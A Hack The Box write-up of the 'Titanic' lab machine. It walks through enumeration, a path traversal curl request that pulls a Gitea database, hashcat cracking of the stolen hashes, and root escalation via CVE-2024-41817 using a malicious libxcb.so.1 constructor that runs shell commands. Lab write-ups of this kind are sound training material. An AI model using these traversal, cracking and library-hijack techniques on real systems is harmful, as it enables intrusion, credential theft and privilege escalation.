+++
title = "HTB - Titanic"
date = "2025-04-20"
author = "dax"
cover = ""
tags = ["flask", "gitea", "path-traversal", "hashcat", "magick", "CVE-2024-41817"]
keywords = ["hacking", "htb", "titanic", "hack the box"]
description = "Write-up of Hack The Box easy machine Titanic"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - Titanic
## Enumeration:
Nmap
```bash
# Nmap 7.95 scan initiated Thu Apr 17 19:38:46 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oN nmaptcp titanic.htb
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
|_http-title: Titanic - Book Your Ship Trip
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Aggressive OS guesses: Linux 4.15 - 5.19 (98%), Linux 5.0 - 5.14 (94%), Linux 3.2 - 4.14 (94%), Linux 4.15 (94%), Linux 2.6.32 - 3.10 (93%), Linux 5.0 (93%), OpenWrt 21.02 (Linux 5.4) (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 2.6.32 (92%), Linux 5.10 - 5.15 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 37.829 days (since Mon Mar 10 23:45:24 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   19.48 ms 10.10.14.1
2   19.94 ms titanic.htb (10.10.11.55)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 17 19:39:18 2025 -- 1 IP address (1 host up) scanned in 32.02 seconds
```

## User exploit

When visiting web port 80, we can see an application that allows us to book boat tickets. By brute forcing the `Host` header, we can also find a `dev.titanic.htb` subdomain. 

```bash
ffuf -u http://titanic.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.titanic.htb' -fs 300-350
```

The `dev` subdomain leads us to a `Gitea` server, which is a self-hosted Github like server. We are able to create an account and find two public repositories owned by the `developer` account. The first one, `flask-app`, contains the code of the boat ticket booking app. By looking at `app.py`, we can see a clear path traversal vulnerability in the `/download` endpoint. 

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

The second one, `docker-config`, contains `docker-compose.yml` files for both `Gitea` and `mysql`. While there are credentials in the `mysql` configuration, what we are actually looking for is the path where the data directory is mounted in the `Gitea` container. 

```yaml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

Now, we can do a little bit of recon on the Gitea file system by running the container locally. The first thing that comes up when we are accessing the configuration page is the default path for the SQLite database, `/data/gitea/gitea.db`. 

```bash
# Start an instance of Gitea for recon
docker run -p 3000:3000 -d --rm gitea/gitea
```

![](/img/htb/titanic/gitea_configuration.png)

Armed with this information, we can now go to the app and exploit the path traversal vulnerability to recover the database. 

```bash
curl --path-as-is -s -H $'Host: titanic.htb' $'http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db' > gitea.db
```

In the `user` table, we can find the hashes for the `administrator` and `developer` users. However, they're not in a format that can be cracked by `hashcat` yet. We can use `Gitea To Hash Extractor` to convert them so that `hashcat` can crack them. The output format is `PBKDF2-HMAC-SHA256`, which is mode `10900`. 

```bash
python gitea_hash_extractor.py gitea.db
```

```batch
hashcat.exe -m 10900 titanic.hashes rockyou.txt
```

We successfully crack the hash for `developer`, which allows us to login using SSH and get the `user.txt` flag. 

## Root exploit

By doing some quick manual recon on the host, we can see a peculiar script in `/opt/scripts/identify_images.sh`. 

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

By having a look inside the `/opt/app/static/assets/images` directory, we can see that the `metadata.log` file is owned by `root` and is updated every minute. Additionally, the `magick` version installed (7.1.1-35) has a CVE (CVE-2024-41817) for an arbitrary code execution. These two findings combined allows us the elevate or privileges to the root user by crafting a malicious shared library containing a command to execute, placing it in the folder where `magick` is executed and waiting for the `root` user to start the script. There are multiple ways of getting the flag from there, but I did it in 2 steps: first I copied the flag out of `/root/`, and then I changed the permission for me to read it. 

CVE-2024-41817 exploits a vulnerability in the way the `AppImage` version of `ImageMagick` sets the `LD_LIBRARY_PATH` and `MAGICK_CONFIGURE_PATH` environment variables. When those environment variables are not set explicitly, an empty path is prepended (and appended), which might lead to `magick` loading the configuration file (delegates.xml) or shared libraries from the current working directory. 

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt /dev/shm/.dax/root.txt");
    exit(0);
}
EOF

cp /dev/shm/.dax/libxcb.so.1 /opt/app/static/assets/images

# Wait a minute for the script to execute...

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("chmod 777 /dev/shm/.dax/root.txt");
    exit(0);
}
EOF

cp /dev/shm/.dax/libxcb.so.1 /opt/app/static/assets/images

# Wait another minute for the script to execute...

cat /dev/shm/.dax/root.txt
```

## Resources:

| Hyperlink                                                                          | Info                                                         |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| https://github.com/BhattJayD/giteatohashcat                                        | Gitea To Hash Extractor                                      |
| https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 | Arbitrary Code Execution in `AppImage` version `ImageMagick` |
| https://github.com/go-gitea/gitea                                                  | Gitea                                                        |
| https://github.com/pallets/flask                                                   | Flask                                                        |
| https://github.com/hashcat/hashcat                                                 | hashcat                                                      |
| https://github.com/ffuf/ffuf                                                       | ffuf                                                         |
